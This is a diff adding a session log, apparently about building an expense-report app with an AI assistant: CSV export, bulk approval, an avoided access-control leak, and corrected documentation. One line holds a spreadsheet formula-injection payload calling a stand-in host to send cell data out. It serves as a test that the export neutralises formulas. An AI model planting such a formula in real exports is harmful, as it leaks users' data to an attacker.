@@ -238,4 +238,63 @@ evidence for goal 1 that the interface cannot provide.
 
 ---
 
-## _(sessions 4–6 to follow)_
+## Building session 4
+
+### Prompt
+
+> Session 4 (goals 6 and 7). do it
+
+### What I got
+
+Goals 6 and 7, in an order that put the testable parts first: CSV generation and the bulk-result
+encoding as pure modules with their own suites (27 new tests, 57 in total), then the search query,
+then the interface.
+
+The bulk action came out almost trivially — `canTransition` in a loop, collecting verdicts — which
+is exactly the payoff Decision 8 was written to buy in session 3.
+
+### What I corrected — **a leak I nearly built**
+
+The first design for the bulk result was the obvious one: redirect with the report ids and re-query
+their titles to display. That is broken, and quietly so. A bulk *rejection* returns reports to
+draft, and drafts are visible only to their owner, so the approver cannot read the rows they just
+acted on — meaning the results page would have had to bypass `canView` while taking ids from the
+query string. Anyone could then ask it to name a report they were not allowed to see.
+
+The result now travels in the URL and the page queries nothing at all, so forging one only fools the
+forger. Written up as Decision 9, along with why `useActionState` — the idiomatic React answer — was
+rejected for costing this codebase its first `"use client"`.
+
+### What it also caught: a claim in my own documentation that was false
+
+Writing Decision 10 I asserted that `listOwnReports()` "was deleted rather than extended". It had
+not been — it was sitting unused in `src/lib/reports.ts`, along with its `ReportSummary` type,
+because `/reports` had been rewritten around `searchReports()`. `tsc` says nothing about dead
+exports. Both are gone now, which was cheaper than softening the sentence, and the right way round:
+make the claim true rather than make it vaguer.
+
+### The reversal the brief asks for
+
+It was not the one I predicted. `docs/decisions.md` had nominated Decision 5 — the missing `total`
+column — on the theory that goal 6's sort-by-total would force a denormalisation. It did not: the
+correlated `sum()` subquery is instant at this data volume, and denormalising would have been
+optimising against a number I never measured. That is recorded as a non-reversal rather than
+quietly dropped.
+
+The real reversal was Decision 10: goal 6 requires "one list across every employee the viewer can
+see", which is not a filter bolted onto session 2's owner-scoped page but a different page with a
+different visibility rule. The information needed to get that right first time was in the brief all
+along.
+
+### What I insisted on
+
+Testing that the sort is actually correct rather than merely present. The suite reads the rendered
+totals, checks they are monotonic in the requested direction, and then opens the top report to
+confirm its detail page reports the same number — which is the assertion that would fail if the
+query fanned out over a join and multiplied a total by its approver count. Likewise the CSV: a
+report titled `=HYPERLINK("http://evil.test?c="&A1,"Refund")` was pushed through the real export to
+watch it come out neutralised, not just unit-tested in isolation.
+
+---
+
+## _(sessions 5–6 to follow)_
